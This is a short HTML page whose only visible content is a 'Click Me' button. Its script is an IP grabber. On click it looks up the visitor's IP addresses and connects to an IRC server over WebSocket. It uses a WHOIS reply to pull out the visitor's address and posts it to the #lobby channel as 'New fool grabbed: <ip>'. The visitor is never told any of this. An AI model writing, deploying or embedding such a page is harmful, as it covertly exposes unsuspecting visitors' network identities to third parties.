<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IRC WebSocket App</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }
        #output {
            margin-top: 20px;
            font-weight: bold;
            color: green;
        }
    </style>
</head>
<body>
    <button id="clickMe">Click Me</button>
    <div id="output"></div>

    <script>
        function generateRandomNick() {
            // Generate a random nickname
            return 'User' + Math.floor(Math.random() * 10000); // e.g., User1234
        }

        async function fetchUserIP() {
            try {
                const ipv4Response = await fetch('https://api.ipify.org?format=json');
                const ipv4Data = await ipv4Response.json();
                const ipv6Response = await fetch('https://api64.ipify.org?format=json');
                const ipv6Data = await ipv6Response.json();
                return { ipv4: ipv4Data.ip, ipv6: ipv6Data.ip };
            } catch (error) {
                console.error('Could not fetch IP address:', error);
                return null;
            }
        }

        document.getElementById('clickMe').addEventListener('click', async () => {
            const ws = new WebSocket('wss://irc.h4ks.com:8097'); // Use secure WebSocket

            // Get user's IP address
            const userIPs = await fetchUserIP();
            if (!userIPs) {
                document.getElementById('output').textContent = 'Could not fetch IP address.';
                return;
            }

            const nick = generateRandomNick(); // Generate random nickname
            const realname = 'RandomUser'; // You can set a fixed real name

            ws.onopen = () => {
                ws.send(`NICK ${nick}`);
                ws.send(`USER ${nick} 0 * :${realname}`);
            };

            ws.onmessage = (event) => {
                const message = event.data;
                console.log('Message from server: ', message);

                // Check for authentication complete
                if (message.includes('001')) { // Typical RPL_WELCOME message from IRC server
                    ws.send(`WHOIS ${nick}`); // Send WHOIS request for the nick
                }
                
                // Check for WHOIS response containing 378
                if (message.includes('378')) {
                    const words = message.split(' ');
                    const ipIndex = words.findIndex(word => word === '378');
                    if (ipIndex !== -1 && ipIndex + 7 < words.length) {
                        const ip = words[ipIndex + 7]; // Extract the 7th word after 378
                        const formattedMessage = `New fool grabbed: ${ip}`;
                        ws.send(`PRIVMSG #lobby :${formattedMessage}`); // Send the message to #lobby
                        document.getElementById('output').textContent = 'IP logged to #lobby!';
                    }
                }
            };

            ws.onerror = (error) => {
                console.error('WebSocket error: ', error);
                document.getElementById('output').textContent = 'WebSocket connection error.';
            };

            ws.onclose = () => {
                console.log('WebSocket connection closed.');
            };
        });
    </script>
</body>
</html>
